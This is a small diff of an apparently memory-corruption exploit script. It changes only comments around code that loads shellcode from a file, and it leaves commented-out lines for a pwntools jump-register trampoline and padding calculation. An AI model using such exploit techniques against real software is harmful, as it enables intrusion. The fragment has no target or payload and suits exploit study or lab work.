@@ -195,7 +195,8 @@ def exploit(offset):
     shellcode = open("/tmp/shellcode", "rb").read()
     print(f"[+] Loaded shellcode of size: {len(shellcode)} bytes")
 
-    # only if 2nd stage payload required
+    # only if first stage payload required
+    # from pwn import asm
     #  register = input("Enter payload register (esp): ").strip()
     #  assembly = asm(f"jmp {register}; add eax, 4")
     #  padding_offset = len(padding) - len(nops) + len(shellcode)
